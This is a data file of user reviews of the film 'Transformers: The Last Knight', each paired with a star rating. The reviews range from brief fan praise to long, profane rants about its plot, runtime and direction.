This thing is difficult to watch. The camera changing from Imax to regular is horrible. The size changes of the screen makes it incredibly hard to watch.,0.5
Had a great time.Cogman was the funny aspect of this film,5
Two worlds collide only one survives best slogan ever.,5
45%!!!! this is the best bringing in more robots,5
people think this is the last i tell them its the beginning,5
Loved the whole unicron plot him rising out of the ground instead of the sky,5
better than age of extincrion good as tf2 i enjoyed it dont understand the hate 3rd one was crap 1st is the best,5
shouldve not killed anthony hopkins charcter man,5
a thrill ride unicron rising up all hell is going to get loose,5
action packed better than the 3rd and the 4th,5
"Fuck you Micheal Bay. Fuck you Mark Wahlberg. Fuck you British Megan Fox. As much as it hurts my heart to say it, fuck you SIR Anthony Hopkins. And for good measure, fuck you Micheal Bay. So, I was never a huge Transformers fan even though I grew up 80's surrounded by it (thanks TMNT!). I didn't really get into it until the CGI show Beast Wars. Even though I had no real connection with the original, I actually really liked the first Transformers movie. The characters were pretty well written, the story wasn't that bad, and it was a good action movie. I somewhat cared about the characters and walked out of the theater pretty happy with what I watched and kinds looked forward to the next one. The second I kind of gave a pass to because it was written and filmed during the Hollywood writers strike so I gave the lackluster writing and somewhat convoluted story down to inexperienced writers doing ""the best the could"". The third one kind of gave me hope because it was much better and the previous and, while the old ""Micheal Bay"" directions was wearing thin, I was still overall pretty happy with the fact that I got to watch robots beat the hell out of each other. Now, I didn't think it could get much worse than Age of Extinction but hoooooolyyyyyyyyyyyy shit was I wrong. Now I had heard less than great reviews about the latest installment but I have a huge man boner for Anthony Hopkins and will watch everything he is in so I was kinda looking forward to it. My wife and I just finished The Last Knight (on of my kids got it for me for Christmas on blueray). Now, there have been very few times in my life where I was honestly angry at trying to watch something, and I went from pissed about halfway through the movie to in a downright rage by the end of, that my wife had a good laugh at watching me. An entire script of shitty one liners and lines that walk you through what you just fucking watched or was going to happen. An attempt to make every fucking thing funny. Shitty new robots that are likable in absolutely no way. I have written full fledged papers in college that I swear to god took less time than this neverending horror show. CGI that made the first one look like a fucking masterpiece of cinema. I have seen SYFY movies that have better storytelling than this piece of human shit. The thing I am most pissed about is that this shitpile of a (I have a hard time calling it this but) movie has forever tainted my view of SIR Anthony Hopkins. It is almost so bad that it almost wiped the memory I had of him being Hannibal Lector. Yes. To me, he will be forever remembered as Hannibal Lector and that stupidass old fuck from Transformers. I go almost as far as to say they should de-knight him. Almost. Everyone involved with this movie should be ashamed of themselves. EVERYONE!!! I am going to the shooting range on Sunday and I now have a target. I don't think I am going to be happier to shoot anything in my life.",1
"If there is one word to describe this movie, it is boring. I haven't even seen it, but in the end, I don't have to because it's being redundant from the past movies. It's just trying to be better than the other ones. In reality, are these films are doing is just further proof that Michael Bay masturbates to every single explosion in his movies.",1
this better be setting up unicron the thanos of transformers,5
"Worst movie I have ever seen. Usually they are at least a bit fun, this sucked the life out of me and was miserable the entire way through. Thank God I had Wonder Woman as eyebleach thanks to a double feature.",1
optimus in the film for 12 minutes megatrin 9 minutes thats a good amount,5
"good except for the token hispanic girl they force to be "" tough"" in it....minorities trailed through out to keep the libs happy and off twitter",5
amazing film optimus prime vs infernocus was great,5
amazing film unicron vs megatron tf6 confirmed by myself and unicron vs dinobots comined,5
ill rank this 3rd in the franchise 1.transformers 2.transformers 2 rotf 3.tranformers tlk 4.tranformers aoe 5.transformers dotm,5
megatron looked so menacing please bring him back for the sequel,5
the best one definatly cant compete with unicron storyline,5
The fifth film in the franchise lacks basic creativity and continues the downward trend of the once promising Transformers series.,1.5
"Once again, less Transformers action screen time and more terrible unnecessary interaction between humans and more human screen time. The story was the only spark of the film, it portrayed a significance to the lore of the Transformers' history and its contribution to their future, the prophecy and the faithful conspiracies like The Last Knight, Holder of the Staff, The Talisman and more are not accurately explained throughout the film but still the movie movies in a fast pace with/without detaling the plot. The jokes and puns between humans and Transformers made absolutely no sense resulting very confusing but still you can laugh at them but you just don't know why and those jokes are more expressed by Sir Edmund Burton who makes old school puns that blends in perfectly with his accent. Character development in the Transformers or the humans had no slight improvement even though there were many Transformers throughout the film. The worst part is the lack of telling the actual sequences that happened but with no accurate history like Galvatron becoming Megatron. The seed, Quintessa's history and many more, they were not shown in the film, it can really get you confused with the timeline. To be honest I loved this franchise but I have to say this is the worst Transformers film ever made",1.5
prime vs bumblebee and megatron and unicron plot saved the film,5
"amazing film""we were brothers once"" words from a wise man",5
"I have loved the Transformers franchise up until now. Yes, they're not huge on plot, but they're not meant to be. However, this movie was such a huge waste of time I think it was just made specifically so they show CGI scenes. The only action movie that I've seen worse than this was battleship. And, that is saying a lot. I'm glad it only went to that home and didn't bother going to the theater.",2
Started off okay. Then within half an hour I had lost the plot & didn't know what was happening. Total rubbish.,1
"Although Im a Transformers fan, this the worst movie of the Franchise and a god awefull movie in general",0.5
mark walberg did a great job dont leave please,5
larry and i both enjoyed this film. i love the fact that Anthony Hopkins was in this movie. it had a lot of action. great special effects and the storyline in historical and new and exciring. and the new autobots were so adorable. very entertaining.,4
"It could have so easily been a great movie, however it was riddled with plot holes, bad editing, and poor writing. Its the movie that can't sit still,",0.5
"An ADD afflicted cacophony of a movie that manages to be boring in spite of having a three-headed dragon, dinobots, and the planet devouring Unicron.",1
"In the Czech Republic you have the movie Transformers the last knight, where you would be trapped by the government and autobots. The last knight starring Mark Wahlberg (Cade Yeager) Anthony Hopkins (Sir Edmund Burton) Josh Duhamel (Colonel William Lennox) has a big explosion on movie theaters everywhere. This movie is action packed, sad, funny, and serious. Cade Yeager (Wahlberg) is a friend of the autobots and is trying to help the autobots save the world. Cade goes all through the whole city trying to get more people to help the autobots so they can save america and go back to their old planet to start rebuilding their old planet. The movie is directed by Michael Bay who also directed Teenage mutant ninja turtles and The Purge, and The Purge Anchary. So if you are into action packed thrillers then these movies would be perfect for you. This movie overall looks great the action packed scenes and the silent dramatic parts are what makes the movie interesting and bold. However the bad part about it is that it is too long once you have been sitting there for two hours it starts getting cramped and you probably have to use the restroom. Cade( Mark Wahlberg ) fits his character perfectly he has the action packed type of body that makes it look like he can handle anything. Overall I would give the movie five out of 5 stars so get a comfy seat and get ready to be on the edge getting ready for a fight or argument to happen between two main character.",5
"If you're watching this film you've got to expect it to be over the top just like every other transformers film. I quite liked the Arthurian legend stuff being brought in to the story and thought it added a little bit more the story that they've been around for ages. Also loved the fact they had Carson from downtown abbey voicing the Butler robot nice touch there. Anyway to finish off if you don't like Michael Bay movies or Transformer movies in general then you will not enjoy this film, if you like both of them like myself then sit back and enjoy yourself.",4
Unicron vs primus in tf 6 is confirmed www.fake news.trolled oh its true its damn true,5
"From director Michael Bay, the man who is most likely to masturbate to an explosion, comes the fifth f***ing movie in the blockbuster dud that makes a few things clear: USA USA!! BOOM!!! And 3 hr run times are her to stay!!",2.5
"I loved this messy, incomprehensible monstrosity. It changes genre, story, tone, concept and characters almost every scene. It's like Bay wanted to do twenty movies and had one film to do it. For the first time Wahlberg's character is a ton of fun. The cast is a blast and I loved this most recent installment in ""stepping inside Michael Bay's brain.""",4
amazing film it deserves better,5
i enjoyed it its a action packed thriller and thatd how you get to the bug leagues,5
"You are making my eyes bleed. Please, stop. I mean it, stop here. You have had enough.",2
Don't understand why it's getting so many bad reviews it was a good film,5
"Absolutely awful, bewilderingly bad and soul-destroying in practically every imaginable way. I'm not sure they're even trying anymore. I can barely summon a feeling about it; if anything, I feel slightly worried about how little I hated it. I can't remember the last time I felt so little while watching a movie. I wasn't even bored, so much as just dazed, like I'd woken up in someone else's dream. At 7 hours 15 minutes, this sets the record as the longest theatrical feature ever made and it is the worst Transformers movie of them all... (Keep in mind that I did not have a watch on me during the screening, so my estimate of the running time might be slightly off. But it certainly felt that long.) Do with that information what you will, it's your money.",1
Jesus Christ... the worst movie of the century.,0.5
"This was a really excellent 5th outing, nearly as good as number 1 and better especially than 3 and 4. There was a little less mindless action and a little more scenes that pushed the story forward. True it managed to visit a whole load of UK locations (refreshing actually for us brits!) but every part of it was thought through, it may be thin, but unexpected stuff kept happening and the usual really long mindless action scene of transformer carnage in act 3 was a far more interesting and considered act. All in all a great surprise, engaging, very witty, I think the ratings of others are somewhat harsh. Go watch it!",4
Don't why I keep torturing myself. Not worth it,1
"I really always want to love these movies but the last two entries in this franchise have just been.....interesting. This was such a mess of new characters, old characters, how the hell does barricade keep coming back after getting destroyed but the autobots can never revive any of their fallen comrades. And why is Cogman so insane.",2
"There's so much great stuff from the original cartoon, I was actually almost excited for this one as unicron was suposibly in this, (SPOILERS) he is but he's earth, piss off Bay! Your writers are crap, I like a fun action film but this was no fun and you've destroyed a great franchise. The robots mean nothing but to serve the story about the humans, you're an idiot Bay! it's supposed to be the other way round.",1
"I feel that Prime should have been evil for longer, it's a bit of a wasted opportunity. Other than that, I enjoyed the film more than Age of Extinction. Once again, Megatron wasn't the main villain, which is a disappointment, but his character was much tougher than in the previous two films.",2.5
im aure they should step up the action mannnnn,5
the best out of the bunch,5
"Ennesima cafonata allucinante del famoso e famigerato regista che non riesce proprio a star fuori dalle polemiche. Cosa ci si pu√≤ aspettare dal quinto capitolo di questa saga terribile? In fin dei conti sono qua a ripetere le stesse cose per la quinta volta: effetti speciali superlativi con una trama, sceneggiatura e con dei personaggi semplicemente imbarazzanti al limite della pena. Forse un pelo meglio rispetto al quarto, che era assolutamente disgustoso. Resta comunque un prodotto commerciale assolutamente da evitare, chiss√† per quale motivo io abbia deciso di vederlo, forse per una particolare vena di masochismo che ancora non conosco della mia personalit√†.",2
"Transformers The Last Knight, the kind if movie with some action, sexual humor, and not much transformers. If Michael Bay haven't removed 40 minutes of the forage it would have been better",2.5
better than the last jedi and at least this gave us a final battle unlike tlj,5
Amazing movie and good directing also great actors üôåüèΩ,3.5
"This is, without a doubt, the best movie released in 2017. A strong story script, wonderful use of symbolism, very good acting, great special effects, and a marvellous soundtrack.",5
amazing megatron was great but he didint get used for any action like tf1 and tf2 thats why they have high ratings,5
i rank this 4rd best only because the final battle was weaker than age of extictions,5
nooooooooooooooooooo anthony hopkins had to die why not hound,5
"For a fifth installment of the Transformers franchise, this one is the most lackluster of the bunch (and this is coming from someone who enjoys the previous movies). The action's not really good anymore and there's not much to enjoy, not to mention, there are so many wasted potentials. Overall, avoid this film, or just rent it. Rating: D+",1.5
yes for me i think u should watch it its worth it,5
has the best story best visuals best casting and they act so good,5
amazig film i hope they carry on cause critics are always here to make transformers look bad,5
definatly the best transformers film so far cant wait for the prequel,5
great anticapatee movie get dvd you will enjoy it,5
Hahahahahahahahaha. Really? Why does this exist?,0.5
unicron rise! megatron and unicron ruling earth is gonna be outstanding,5
keep his franchise going is so great,5
amazing film the best one in the franchise so far,5
better than 3 and 4 still dont understand it,5
this has to be the greatest one out of all because we het the same fpr all 4 until now we get unicron,5
tf7 the last stand yes,5
this is brilliant and original,5
autobots are always on top of decepticons,5
keeps on getting better you cant beat it,5
if you dont know who unicron is he is in the earths core here to mess everything up in the next film,5
"Not bad, but not what I expected from the latest movie (kind of disappointed in lack of fresh ideas and quality of story, even though it started off very promising, to be honest). The next film will be better - I know it!",3.5
"Terrible, but so predictable in how awful it is that it's hard to really be offended by it. Quick confession: I actually was very tempted to watch the film in IMAX 3D. Bay can shoot action as well as anyone, and I was curious about watching it in this format given that a majority of it was shot in IMAX 3D cameras. While the final action sequence is indeed visually impressive, no chance in hell would have watching it in IMAX 3D have rescued this endeavor. The movie is one long chase sequence filled with slow-motion collisions and explosions, stopped only temporarily long enough for feeble attempts at telling a story or poor, and I mean piss poor attempts at humor. Want a scene where it the two lead characters searching for Merlin's staff in an old study sounds like them having loud, angry sex? You've come to right place. None of the story makes sense, none of the casting decisions make sense (we're supposed to buy focking Mark Walberg, supah cahp as an engineer from Texas and Laura Haddock as professor with supermodel looks). Oh and Stanley Tucci makes a cameo as Merlin despite playing another character in a previous film for absolutely no reason whatsoever. But the worst, the absolute worst part of the film is how unnecessarily long it is. It's near 2.5 hours long, and is packed to the brim with unnecessary characters, chunks of dialogue with awful humor, and entire action sequences that do nothing but poison the film. T:tLK is bloated, sloppy, and shockingly boring.",1
better than most transformers,5
this whole film was a set up for tf6 plus suprised it only got 600mill,5
amazing cant wait for bummblebee solo,5
i personally believe its not as bad as 4 and 3,5
spectacualer and entertaining not a 45% more of a 70%,5
its really good introducing unicron we all have been waiting for this next film is transformers:rise of unicron,5
"Why are they making more transformer movies? The story is tired, poor Optimus Prime is also tired",0.5
"... and yet ANOTHER movie that cannot resist the compulsion to try and ""educate"" the public on social justice topics. This movie lost me the second I heard the word ""racist"" not so cleverly woven into the sophomoric script... Dear Hollywood, Not every movie has to contain social justice mind control programming. In fact, less than .0005 percent of all movies should have anything smacking of social justice lecturing in their scripts. Keep lecturing me on social justice ideals when I spend good money trying to escape and relax, and I will continue to go see movies less, and less, and less. I'm down to about 2 theater visits per year because I just can't stand your garbage movies any more.",0.5
Worst entry of the franchise. They should have left the whole thing it at the trilogy. There was is much going on for no reason.,0.5
Truly terrible with no proper ending sequence. Even films about giant space robots need a sensible ending!!!,1.5
UNICRON AND PRIMUS FINALLY,5
its action packed also alot of fun like all previous ones,5
okay amazig spectacualer the best out of the 5 by far,5
probably one of the best films of the year score: 8.9,5
amazing action packed,5
Delivers exactly what you'd expect from a Transformers movie. My son and I thoroughly enjoyed this for what it is so if you're expecting Shakespeare then you're an idiot for wasting your your own time!,4.5
Definitely the worst movie of the series and one of the worst of all times. Horrible script and a shame for Wahlberg and Hopkins for participating in this monstrosity.,0.5
amazing film cant be better,5
I gave up at the 30 minute mark. This movie is about as engaging as playing Connect 4 - with yourself.,0.5
Action scene is still fun and interesting. But suffer a lot of having too many sequels that are not significant and difficult to recall all the characters from the previous films.,4
Total garbage! Please rebbot the franchise. Look to the G1.,0.5
I don‚Äôt go to see Transformers expecting possible Oscar winning material. I know this is a live action cartoon. So grab your popcorn and get ready ‚Äòto roll out‚Äô with Optimus and the gang.,3.5
"Too long, boring, non-sensical and it doesn't even rise to the level of being so bad it's good. The performances are bog standard, the plot makes little sense and Michael Bay continues to rely on extensive CGI explosions to convey emotion and it doesn't work at all. One star for Anthony Hopkins because you can tell he knows how stupid this film is and he has a ball with it.",1
"It Is incredible. For two and a half hours Bay throws everything at you: effects, an attempt at a story, action, robots, etc, and it still is so damn weak. Personally, it is the worst of the series hat already pretty much blows",0.5
I just want to add here that this is THE worst film I've ever seen. It's almost enjoyable how terrible it is. It makes the first film seem like a masterpiece!,0.5
Stop making them Michael Bay. I didn't mind the others but now your ruining my childhood.,2
"A waste of brain cells and time. I can't believe they have officially destroyed Transformers over the last two releases. The comedy stunts should NEVER have been in this movie. The children, in the beginning, should have been taken out (waste of footage space), the crack joke to the Spanish girl was an insult on many levels (calling her a mini J. LO, there is a burrito in the fridge if you get hungry), the script was so rushed. Why the hell do they always have to make a black man a comic or seem like a dumb ass? This movie was so racial on many levels. The robots were acting stupid from dancing to snap jokes to the movement to plan old inaccuracies. What the hell is wrong with Paramount? The first 3 movies were passable yet you fucked up the mast two movies and you expect me to watch your next two movies? Sorry, you have lost a fan and I don't give a hoot if it changes or gets better. For me to ever consider watching another Transformers Movie is if Michael Bay and the entire cast is gutted from the movie. Start fresh and keep it to the cartoon many adored. Any actor that played in this crap of a film became a B side actor in a high-cost special effects catastrophy.",0.5
"It was okay....... I mean the acting, special effects, and storyline was decent but I just feel like the transformers movies are starting to lose their touch.",2.5
"Can we all agree that the Transformers movies should just die? Michael Bay has destroyed this franchise irreparably. Please, Michael. Let. It. Die.",0.5
"It could potentially be so good but it didn't come through. A little disappointing, but expected from the franchise.",1.5
"I have seen this movie with my dad but I missed the very beginning of this film. I would definitely go ""ok"" with this one just like ""Transformers: Age Of Extinction"" that I have saw back in 2014 and this 2017 one is the sequel to the 4th one.",3
It was good. Original trilogy still better.,3.5

"From the first Transformers movie in 2007 to 10 years later of action packed movies it makes a return to the big screen as the director Michael Bay comes back stronger than ever with his latest film Transformers: The Last Knight. We see all sorts of familiar faces from the last film Transformers: Age of Extinction and beyond. As well as being introduced to a few new faces. The plot of the movie is based the medieval days with the nights of the round table. Optimus Prime leader of the Autobots has left earth in search of his creator to destroy whoever it was that put the bounty out for all Autobots and Decepticons to be destroyed. Cade Yeager is the main character that was in the previous movie is back again helping to protect the Autobots. It turns out that he possesses a certain robotic talisman that makes him a knight of the Transformers order. It is up to him to help save the earth from the creator who is determined to destroy the earth and anything that stands in the way. My thoughts on the movie where I felt like Michael Bay did a great job with this movie. I really enjoyed the movie from start to finish. I am more of an explosion action type of movie person, so this film was for me. I was not into the whole love dramatic boy meets girl falls in love type of thing in the first three movies of transformers. Don't get me wrong they were well scripted movies with plenty of action fighting robot scenes. With the first scene starting off with war between two groups it had a ton of action in it as people are fighting for their lives with fireballs being launched and smashing into human warriors, it draws my attention right away. There was never a dull moment in this film as the flash back is over it continues with more action as humans are going around the city that is in ruins from the previous destruction that was caused. They are trying to destroy every Autobot or Decepticon they see. Cade Yeager being the hero he is shows up guns blazing to save these kids from cross fire as well as trying to help protect and Autobot. Even though the movie does not really follow the original comic books at all there were a few things that really stood out in this movie that I thought were really cool. The opening scene helps tie in the whole movie well on how they show the history of the knights. It was a change of scenery into a different time than just the early days of life from the last movies, it brought more history and excitement into the movie that hooks the viewers. This movie threw a major curve ball with more female roles who actually make a difference in this movie, as well as making a female actor the actual hero which was amazing. It takes away from the whole damsel in destress and the typical movie plot, making the movie that much better. There were a few negative parts to the movie that weren't that major but could have made this movie a little more enjoyable. I didn't like how there were few fight scenes of the legendary warriors. They are supposed to be these badass Robots but don't have much role in this movie let alone they only show the T-Rex and not the rest, but with the exception of smaller versions of themselves. It is hard to even know how powerful these new and legendary worriers are when we don't even see them used to their full potential in fight scenes. I also felt they could have utilized the dragon robot a bit more it was the same as the legendary warriors having little to do with how much power each possess. I enjoyed this movie and what Michael Bay did in his vision on what transformers movies should be. The CGI throughout the movie was great. I would definitely recommend this movie to those who like a lot of action and fight scenes. This movie also keeps you hooked in wondering what is going to happen next which is always a plus there are a few hints but not enough to know what exactly will be in the next film. I expect the next film to be even better than this one since Unicron is now awakened.",4
It has very messy plot:( I feel like its the same thing over and over again. I fell asleep in the movies watching it.,0.5
Not how I remembered it from my early years,0.5
"OK lets just jump into this shall we. The plot: I'm not even going to attempt to explain the plot for this 2 hour plus whirlwind of CGI metal shrapnel. You may well ask why, and the answer to that is simple. Where as I did understand the basic main outline of the plot, its so unbelievably convoluted, choppy, hectic, incoherent, nonsensical etc...that its virtually impossible to explain. Its literally a review in itself, but put basically, it revolves around a mcguffin that can save Cybertron, but is also required to save Earth. Right OK so the movie kicks off in medieval England, 484 AD. It is a time of Arthurian legend, King Arthur, Merlin, the knights of the round table...errr...transformers. Yes so we know this isn't an accurate account of ancient British history. Its a stupid fantasy movie based on (supposed) legend with large transforming alien robots. Nevertheless this opening sequence did actually look pretty good I thought. The idea of ancient transformer knights in ancient medieval Britain was actually way more interesting than the rest of the modern day set movie. I still have to point out the fact Bay and co actually cast a black actor as a British knight in this Arthurian period. That's just as ridiculous as having the fecking robots! That's the second major motion picture that has done that, what gives?! Its at this point we learn about the ancient Cybertronian knights coming to Earth and giving Merlin this magic staff mcguffin. But this did raise questions from me initially such as, what's so special about these transformers that they are called knights? Why did they steal the staff from Cybertron? What does the staff do on Cybertron? I believe they hid the staff on Earth because Earth is in fact Unicron (an ancient enemy of Cybertron). They were trying to protect Unicron from Quintessa, a Decepticon sorceress intent on destroying Unicron to save Cybertron. So this led me to think Unicron is a goodie in this movie? Because he was originally a Decepticon. But also, wouldn't the Cybertronian knights wanna help save Cybertron also? It is their home planet after all. Confusing!!! Its also around this point that Prime (who was spiralling frozen through space, I forget why) lands on Cybertron. But what that intended? He was drifting frozen through space, was it pure luck that he landed on Cybertron or did he put himself on a pre-set course?? Also why was he frozen? Transformers fly through space quite often it seems, or so we've seen before. Heck didn't Starscream fly to Cybertron in one movie? Why didn't he freeze up? Does Bay and co even care what they did in previous movies??? Also when Prime gets to Cybertron he questions what has happened to his homeworld. But...shouldn't he know what happened? The whole Cybertronian war thing... K lets look at the new characters, or in this new movie, the new politically correct characters because Bay's jumpin' on bandwagons. Firstly we now have kids in this movie, some smartass retro lookin' kids. You know because Bay clearly saw [i]Stranger Things[/i] and thought 'I can do that!'. So these kids consist of three tough streetwise kids who happen to be African American, Latino and Asian I think. And then you have the stereotypical curly haired, spectacled, nerdy white kid who's a wimp. These kids are purely in the movie to add more diversity and a kids point of view. Kinda pointless seeing as they do nothing other than get in the way. The final kid is another tough streetwise girl who's a bit older than the others. This is Michael Bay's strong female character to appease the feminists. She's constantly crying, shouting, growling and acting as deadly serious as possible, you know...for gravitas. This was supposed to be 'empowering' for girls and was clearly pushed as such before the movies release with a string of laughable TV spots/trailers. In them the character talks to the camera as if she was doing an interview. Its shot as if the movie was an account of a real war situation or something, its pathetic. Again its all pointless because after the first ten minutes or so she's hardly in the movie. Oh and this time there's also a little BB-8 type character in here too, you know because Bay saw 'Star Wars: The Force Awakens' and thought 'I can do that!'. So voil√†! Instant merchandise for the movie. What's actually amazing is how this little piece of crap is clearly a cross between BB-8 and R2-D2, like in a copyright kinda way. Things move so thick and fast in this movie its actually hard to keep up. So I realise Transformers have kinda made Earth their new home here and presumably new ones have crash landed over time. But can someone explain where the baby Transformers came from? The baby Dinobots, I presume they were Dinobots. Then you have the same stupid crap carried over from the previous movies with Transformers having hats, chewing cigars, having coats and the Japanese Autobot having a Mercedes badge on him. That really doesn't make sense to me but whatever. But why does this Autobot have the features of a Japanese samurai? I mean...why would he? Then there's the new task force whose job is to hunt down Transformers, they are called the TRF. But...but...what happened to the last task force? So far we've had a plot that started in the dark ages of England with various characters. It then fast forwards to our present day and a US military point of view; from faceless characters that spend the entire runtime in offices behind computers (or John Tururro on the phone the entire time). It then switches to a children's point of view for literally one action scene before then jumping onto our main protagonists point of view (Mark Wahlberg). This is all in the space of the first 30 minute or so, and we haven't even be introduced to all the characters yet either! Despite all the obvious pandering and stealing of ideas, Bay still manages to toss countless more overused and unoriginal ideas into the mix. Outta nowhere we get a calling card sequence for some Decepticons; you know when they stick the characters name up on the screen along with some rock music. Its been done to death in loads of movies and can be effective, but here it looks completely out of place and a desperate attempt at riding the coattails of some recent blockbusters. So we get a team of nasty Decepticons that are so badass they required this calling card sequence to showcase their badass names. Yet despite their gangsta speech patterns and bling, these guys get killed off very quickly which kinda makes you wonder why they were introduced in the first place. Next! Oh my God I could spend the rest of this month writing about this movie and its bollocks. Anthony Hopkins character apparently lives in a huge castle full of ancient artifacts that must be worth millions altogether, not including the castle itself! We get a sequence showing the Autobots helping the allies fight against the Nazi's (wouldn't both world wars have ended pretty quickly with Autobots helping?). There's a high speed chase through Westminster in super performance cars which, if you know London, is a complete joke. Add to that the fact the characters jump from one supercar to another with ease. This all ends with Hopkins, Wahlberg and co stealing British submarine the [i[HMS Alliance[/i] (yes indeed!). Would a defunct WWII submarine being used as a museum since 1981 even run anymore? Oh its a Transformer too, of course it is (he says cackling insanely to himself). I also don't think a submarine of that type and age (or any) would have large windows like this one apparently does. Naturally the TRF have their own sub it seems, a regular fecking [i]G.I. Joe[/i] unit these guys. They then discover the sunken alien ship which no one has ever stumbled across before up to this point apparently. Unsure as to where this was located, I guess the Atlantic somewhere but at this point I gave up even wondering because it could have been anywhere lets face it. Its around this time the movie was heading well north of the standard runtime for a crappy movie of this caliber. As the action pointed towards Stonehenge it slowly became more and more convoluted, nigh unwatchable. There are battles kicking off everywhere as Cybertron attaches itself to Earth, which you'd think would cause irreversible damage to our planet but whatever. The goodies fight the baddies, errr...some are defeated, some are killed...I think. The talisman mcguffin is revealed and stops the destruction of Earth, whilst also leaving Cybertron perfectly OK as well. So essentially what was all the fuss about? In all my days I've never seen such a convoluted mess, which is supposed to be for kids...isn't it?? Jesus fecking Christ it was a chore to get through this; I almost gave up on a few occasions because I was so bored and ultimately confused. Apart from the nonsensical plot and film length, the editing is terrible. Jumping all over the place in a blur of nonstop action (what's new). The aspect ratio is also bouncing around all over the shop. There are multiple characters in here that needn't be, they are literally not required (both human and Transformer). Of course you have all the usual Bayisms we've all come to expect; I don't even need to list them because you know exactly what I'm talking about. Sure it all looks super slick and glossy, but again we've all come to expect that, that no longer holds any weight. Style over substance is an understatement! But we all know that now. It is however ironic that the stupidest part of the movie (the medieval opening), was by far the most intriguing. If this legendary 80's franchise is to have any kind of future at all, it needs to be completely rebooted. Possibly in animated form, and probably going back to the classic original animated designs. In turn, any and all knowledge of these Bayformer movies should be erased from human history.",1.5

"Transformers: The Last Knight,"" the dreaded fifth movie in the Transformers series is supposedly the last to be directed by Michael Bay and the last to star Mark Wahlberg. Wahlberg plays his character Cade from the previous one. The ""attempt"" at a plot for this movie goes something like this: Cade comes into possession of an ancient Transformers artifact called the Talisman and he is the ""chosen one"" to carry out a ""quest"" for the transformers, while this chick named Vivian has to acquire Merlin's ""staff"" because for some reason she is the ""only one who can wield it"" and Optimus Prime heads to Cybertron to find out ""where he and the transformers came from and what they're doing on earth."" THAT'S this movie's plot. Lol this movie thinks it has a plot. This movie is completely incapable of telling a cohesive story. There is no beginning, middle, or end. It throws plot threads at you and expects you to roll with them. The most illogical plot devices occur in this movie. NOTHING makes any sense. It is so convoluted that the movie thinks the audience are idiots. How many times was I reminded of what the plot was throughout the entirety of this atrocity? I counted at least 32. Nothing of importance happens. Nothing is interesting, nothing is entertaining. The characters are so thinly written and poorly developed I didn't care who lived and who died. At this point in the series, I DON'T CARE ABOUT THE DAMN HUMANS! Just give us a movie about Transformers, not about humans. None of them are likable AT ALL. Everything involving the military, the government, Anthony Hopkins, it's all pointless! The movie spends so much time and energy on all the stuff everyone complains about with these movies that none of it comes across as not appealing, but rather annoying. It's an insult to our intelligence. The action scenes are the same lazy action scenes the other four Transformers movies feature. It's stuff that appeals only to teenagers who do not know how a movie is crafted. Teenagers like action and explosions and no talking, story, characters, or emotion. This movie appeals to those teenagers. There I said it again. Watching stuff just blow up and blow up and blow up and blow up and blow up and blow up continuously for two and half hours is extremely boring, especially since it's the only thing that has happened for five Transformers movies in a row. There is no entertainment value to be had just watching stuff blow up for a bloated and overlong runtime. And yes, the runtime is too long, YET AGAIN. Luckily, it is shorter than the fourth one which was a very drab and dreary two hours and forty-five minutes. This is about fifteen minutes shorter, but it easily could have been an hour shorter. Nothing content wise justifies the runtime of this monstrosity. It's still overstuffed, overlong, dreary, boring, and exhausting, just like the previous three. I'll give the first one a pass since I actually enjoy the first one. This has all the Bay-isms in it. The typical stereotypes, the typical humor, and the typical dialogue, all of which is stupid, offensive, and insulting. S many characters are made fun of in this movie for being different or having different accents you thoroughly understand why NOBDOY LIKES MICHAEL BAY. He is racist, sexist, and doesn't care about the audience. He cares only about himself and no one else. It shows. The two girls in this movie, in typical Michael Bay fashion, are all hotted out. The young girl is like 14. In what world is this right? Her tits just hang out the entire movie. The other chick just looks like a porn star. That's what this series has come down to folks, strippers and porn stars! Optimus Prime is literally in the movie for ten minutes to just say his name three times so that we don't forget about him and who he is and completely forget that this movie gives him the most sudden shift in character motivation I have ever seen, more sudden than Batman in Batman V Superman. If you came to see him wreck house, he is a total waste in this movie. Quite frankly, none of the Transformers really don anything in this movie. They all just kind of hang out and chill and insult each other with stereotypes. This is one of the worst of the year. I felt like I lost IQ points watching this movie. It is a loud, dumb, idiotic, incoherent, chaotic, soulless mess that appeals only to teenagers who like nothing but action and explosions and die hard fans of the series. It is worse than Age of Extinction. I'm just gonna give ""Transformers: The Last Knight"" an F-. Yes that is now officially a grade.With as many talented people involved in this project as there are, you would think that at some point they realized what they were making wasn't so good? That doesn't seem to be the case with Transformers: The Last Knight. However bad you thought the last few Transformers films have been, nothing can prepare you for the abomination of this film. Hearing about all of the silly subplots this film had beforehand had me very skeptical about Michael Bay's ability to cohesively tell a story amidst all of the CGI-heavy action. Not that any of the last 3 Transformers movies boasted an Oscar winning story, but they at least had some sort of focus. Plus, Bay proved once again with 13 Hours that he can make a real film with real characters. But all of that gets thrown out the window with The Last Knight. Not only is it extremely difficult to get behind any of the character's convoluted motives, most of them don't even deserve to be in the film. It's one thing to have a few humans ground this bigger than life story, it's another thing entirely to put the focus on the humans and have the Transformers be ancillary characters. This isn't about Transformers at all, it's about Mark Wahlberg's 'Cade Yeager' character being the chosen ""Last Knight"" and Laura Haddock's 'Viven Wembley' being the last surviving member of the Witwicky family. Because, you know, every important person in the history of humankind has been a secret member of the Witwicky's, protecting the Autobots from the world. Makes sense. In fact, the most popular Transformer, Optimus Prime, is in the film for maybe 15 minutes. Not that these films ever appealed to me, but I didn't go to see a Transformers movie for the humans, I went for the robots. On that note, Bay duplicates what he's always done with these movies is make some impressive action sequences. It's the one thing I can't really pick apart. Even with that said, the action sequences don't add anything new to the series. Without any emotional connection to the bots or any detailed differences between them, it's all a bunch of nonsensical slow-motion CGI. Speaking of which, the constant slow motion certainly doesn't help with the excessive runtime. Even with Michael Bay coming out and saying it's ""significantly"" shorter than the last 3 films doesn't change how unnecessary a 2 and a half hour Transformers film is. Cut out the supporting characters who add nothing (Izabella, Jimmy, that physicist guy), remove the Arthurian scenes (because that was a missed opportunity, and god help us please take out all of the misplaced unfunny humor. When the film pauses for the audience to laugh and nobody even dares to chuckle, there's something seriously wrong with the script. What's the solution here? We know Paramount will continue to make more Transformers films, and rightfully so (they make over a billion), and we know Paramount will inexplicably hire Michael Bay again (BC he's not going to retire). How can they continue to hire a guy who dismisses any nuances in the script with his own racist, sexist, and dated direction? Did they not gather a writer's room with like 10 renowned writers for this film? Well, I think the solution is to just stop going. I should have stopped going after the last film, but I held out hope one last time. As long as Bay is behind these films and directs without any care in the world, then I won't be considered part of the audience. Enough is enough. I'm done.Future generations will study this movie as the dawn of a new age in film-making. It has everything you could possibly want out of two- and-a-half hours of cinematic, action-packed gold; and so much more besides. Anthony Hopkins giving the finger to the police outside downing street and calling random 